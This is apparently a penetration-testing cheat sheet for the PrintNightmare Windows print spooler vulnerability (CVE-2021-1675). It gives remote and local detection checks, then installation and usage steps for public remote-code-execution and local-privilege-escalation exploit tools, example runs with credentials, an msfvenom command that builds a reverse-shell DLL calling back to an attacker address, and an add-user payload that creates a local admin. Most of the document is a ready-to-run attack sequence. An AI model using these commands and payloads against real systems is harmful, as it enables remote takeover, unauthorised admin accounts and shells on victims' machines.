# Remote Detection
When running:
```bash
rpcdump.py @<VICTIM_IP> | egrep 'MS-RPRN|MS-PAR'
```

*if the computer is vulnerable,* the output should be:
```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

# RCE Version [Github](https://github.com/cube0x0/CVE-2021-1675)

## Installation
```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```
## Usage
```
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share

CVE-2021-1675 implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
                        and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
```
## Example
```bash
CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
```

## DLL payloads
### Reverse Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=20.20.20.129 LPORT=9000 -f dll > rev.dll
```
### Adduser Payload
```
msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD_MATCHING_COPLEXITY>
```

---

# Local Detection
When runnnig:
```shell
REG QUERY "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
*if the computer is vulnerable,* the output should be:
```
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
    NoWarningNoElevationOnInstall    REG_DWORD    0x1
```

*Also,* the print spooler service should running
```shell
gsv spooler
```

# LPE Version [Github](https://github.com/calebstewart/CVE-2021-1675)
## Usage (Creating Local Admin)
```
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DriverName "<ANY_NAME>" -NewUser "<USERNAME>" -NewPassword "<PASSWORD_MATCHING_COPLEXITY>"
```
## Usage (Custom DLL)
```
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare -DLL "<FULL\PATH\TO\DLL>"
```